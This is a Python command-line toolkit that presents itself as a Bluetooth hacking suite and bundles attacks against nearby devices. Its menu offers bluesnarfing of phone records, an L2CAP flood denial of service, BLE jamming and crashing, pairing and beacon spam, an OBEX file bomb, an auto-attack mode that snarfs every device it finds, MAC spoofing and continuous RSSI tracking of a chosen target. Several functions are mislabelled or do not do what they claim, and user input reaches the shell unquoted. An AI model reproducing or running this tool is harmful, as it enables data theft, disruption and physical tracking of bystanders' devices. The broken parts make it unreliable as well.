#!/usr/bin/env python3
# ZeroSync v3.0 - Cyberpunk Bluetooth Hacking Toolkit (CLI)
# Author: Niko DeRuise
# For educational use only

import os
import re
import subprocess
import sys
import time
import shutil
from datetime import datetime
from rich import print
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt

# === Globals ===
console = Console()
log_dir = "zerosync_logs"
os.makedirs(log_dir, exist_ok=True)

def log_output(name, content):
    with open(os.path.join(log_dir, f"{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"), 'w') as f:
        f.write(content)

def run_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return output.strip()
    except subprocess.CalledProcessError as e:
        return e.output.strip()

def get_adapter():
    out = run_cmd("hciconfig")
    matches = re.findall(r'(hci\d+):\s+Type', out)
    return matches[0] if matches else None

def enable_adapter(hci):
    run_cmd(f"rfkill unblock bluetooth")
    run_cmd(f"hciconfig {hci} up")

# === Classic Attacks ===
def scan_devices():
    console.print("[bold green]Scanning for Classic Bluetooth devices...[/bold green]")
    out = run_cmd("hcitool scan")
    print(out)
    log_output("bluetooth_scan", out)

def bluesnarf():
    target = Prompt.ask("Target MAC address")
    out = run_cmd(f"bluesnarfer -b {target} -r 1-100")
    print(out)
    log_output("bluesnarf", out)

def bluebug():
    target = Prompt.ask("Target MAC address")
    out = run_cmd(f"sdptool browse {target}")
    print(out)
    log_output("bluebug", out)

def bt_dos():
    target = Prompt.ask("Target MAC address")
    out = run_cmd(f"l2ping -i 0 -s 600 -f {target}")
    print(out)
    log_output("bt_dos", out)

def blueflood():
    target = Prompt.ask("Target MAC address")
    for i in range(50):
        run_cmd(f"hcitool cc {target}")
        run_cmd(f"hcitool auth {target}")
    log_output("blueflood", f"Flooded {target} 50 times")

def rfcomm_hijack():
    out = run_cmd("sdptool browse local")
    print(out)
    log_output("rfcomm_hijack", out)

# === BLE Attacks ===
def ble_scan():
    out = run_cmd("hcitool lescan --duplicates --passive")
    print(out)
    log_output("ble_scan", out)

def ble_adv_spoof():
    name = Prompt.ask("Fake BLE device name")
    out = run_cmd(f"bleah -A -n '{name}'")
    print(out)
    log_output("ble_adv_spoof", out)

def ble_sniff():
    out = run_cmd("btlejack -s")
    print(out)
    log_output("ble_sniff", out)

def ble_jam():
    out = run_cmd("btlejack -j")
    print(out)
    log_output("ble_jam", out)

def ble_crasher():
    target = Prompt.ask("Target MAC")
    out = run_cmd(f"bleah -b {target} -c crash")
    print(out)
    log_output("ble_crasher", out)

def ble_mesh_spam():
    name = Prompt.ask("Spam BLE name")
    for i in range(20):
        run_cmd(f"bleah -A -n '{name}_{i}'")
    log_output("ble_mesh_spam", "20 spam beacons sent")

def ble_gatt_viewer():
    target = Prompt.ask("Target MAC")
    out = run_cmd(f"gatttool -b {target} -I")
    print(out)
    log_output("ble_gatt", out)

def ble_write_char():
    target = Prompt.ask("Target MAC")
    handle = Prompt.ask("GATT handle (e.g., 0x0025)")
    value = Prompt.ask("Hex value to write (e.g., 0100)")
    out = run_cmd(f"gatttool -b {target} --char-write-req -a {handle} -n {value}")
    print(out)
    log_output("ble_write", out)

# === New v3.0 Attacks ===
def blueborne_scan():
    out = run_cmd("python3 blueborne-checker.py")
    print(out)
    log_output("blueborne", out)

def legacy_pin_bruteforce():
    target = Prompt.ask("Target MAC")
    wordlist = Prompt.ask("Path to PIN wordlist")
    try:
        with open(wordlist, 'r') as f:
            pins = f.read().splitlines()
        for pin in pins:
            out = run_cmd(f"l2ping -c 1 {target}")
            console.print(f"Trying PIN: {pin} => {out}")
    except Exception as e:
        print(f"Error: {e}")

def obex_file_bomb():
    target = Prompt.ask("Target MAC")
    file_path = Prompt.ask("Path to file to send (e.g. .zip)")
    out = run_cmd(f"obexftp --nopath --noconn --uuid none --bluetooth {target} --channel 9 -p {file_path}")
    print(out)
    log_output("obex_bomb", out)

def auto_attack_scanner():
    out = run_cmd("hcitool scan")
    print(out)
    targets = re.findall(r'((?:[0-9A-F]{2}:){5}[0-9A-F]{2})', out)
    for t in targets:
        run_cmd(f"l2ping -c 1 {t}")
        run_cmd(f"bluesnarfer -b {t} -r 1-20")
        run_cmd(f"sdptool browse {t}")
    log_output("auto_attack", out)

def rssi_tracker():
    target = Prompt.ask("Target MAC")
    try:
        while True:
            out = run_cmd(f"hcitool rssi {target}")
            print(out)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[bold yellow]Tracking stopped.[/bold yellow]")

# === Utilities ===
def mac_spoof():
    iface = get_adapter()
    new_mac = Prompt.ask("New MAC")
    run_cmd(f"hciconfig {iface} down")
    out = run_cmd(f"bdaddr -i {iface} {new_mac}")
    run_cmd(f"hciconfig {iface} up")
    print(out)
    log_output("mac_spoof", out)

def vendor_lookup():
    mac = Prompt.ask("MAC")
    oui = mac.upper().replace(":", "")[:6]
    out = run_cmd(f"grep {oui} /usr/share/ieee-data/oui.txt")
    print(out if out else "[yellow]Vendor not found[/yellow]")

def monitor_connections():
    out = run_cmd("hcitool con")
    print(out)
    log_output("bt_connections", out)

def reset_bt():
    iface = get_adapter()
    run_cmd(f"hciconfig {iface} down")
    time.sleep(1)
    run_cmd(f"hciconfig {iface} up")
    run_cmd("rfkill unblock bluetooth")
    print("[green]Bluetooth adapter reset[/green]")

def tool_checker():
    tools = ["hcitool", "l2ping", "bdaddr", "bleah", "btlejack", "bluesnarfer", "gatttool", "obexftp"]
    table = Table(title="Tool Availability")
    table.add_column("Tool")
    table.add_column("Status")
    for t in tools:
        status = "✅" if shutil.which(t) else "❌"
        table.add_row(t, status)
    console.print(table)

# === Main Menu ===
def main_menu():
    iface = get_adapter()
    if not iface:
        console.print("[red]No Bluetooth adapter detected.[/red]")
        return
    enable_adapter(iface)

    while True:
        table = Table(title="[bold cyan]ZeroSync v3.0 - Bluetooth Hacking Toolkit[/bold cyan]")
        table.add_column("ID", style="bold magenta")
        table.add_column("Action")

        menu = [
            ("01", "Scan Classic Devices"),
            ("02", "BlueSnarf"),
            ("03", "BlueBug"),
            ("04", "L2CAP DoS"),
            ("05", "Pairing Flood"),
            ("06", "RFCOMM Hijack"),
            ("07", "BLE Scan"),
            ("08", "BLE Advert Spoof"),
            ("09", "BLE Sniff"),
            ("10", "BLE Jam"),
            ("11", "BLE Crasher"),
            ("12", "BLE GATT Viewer"),
            ("13", "BLE Write Char"),
            ("14", "BLE Mesh Spam"),
            ("15", "MAC Spoof"),
            ("16", "Vendor Lookup"),
            ("17", "Monitor Connections"),
            ("18", "Reset Adapter"),
            ("19", "Tool Checker"),
            ("20", "BlueBorne Scanner"),
            ("21", "Legacy PIN Brute Force"),
            ("22", "OBEX File Bomb"),
            ("23", "Auto Attack Scanner"),
            ("24", "RSSI Signal Tracker"),
            ("00", "Exit")
        ]
        for id, action in menu:
            table.add_row(id, action)
        console.print(table)

        choice = Prompt.ask("[bold green]Choose an option[/bold green]")

        actions = {
            "01": scan_devices,
            "02": bluesnarf,
            "03": bluebug,
            "04": bt_dos,
            "05": blueflood,
            "06": rfcomm_hijack,
            "07": ble_scan,
            "08": ble_adv_spoof,
            "09": ble_sniff,
            "10": ble_jam,
            "11": ble_crasher,
            "12": ble_gatt_viewer,
            "13": ble_write_char,
            "14": ble_mesh_spam,
            "15": mac_spoof,
            "16": vendor_lookup,
            "17": monitor_connections,
            "18": reset_bt,
            "19": tool_checker,
            "20": blueborne_scan,
            "21": legacy_pin_bruteforce,
            "22": obex_file_bomb,
            "23": auto_attack_scanner,
            "24": rssi_tracker,
            "00": lambda: sys.exit(console.print("[cyan]ZeroSync terminated.[/cyan]"))
        }

        if choice in actions:
            actions[choice]()
        else:
            print("[red]Invalid choice.[/red]")

        input("[bold yellow]Press Enter to return to the menu...[/bold yellow]")
        os.system("clear")

if __name__ == "__main__":
    if os.geteuid() != 0:
        console.print("[red]Run with sudo.[/red]")
        sys.exit(1)
    main_menu()
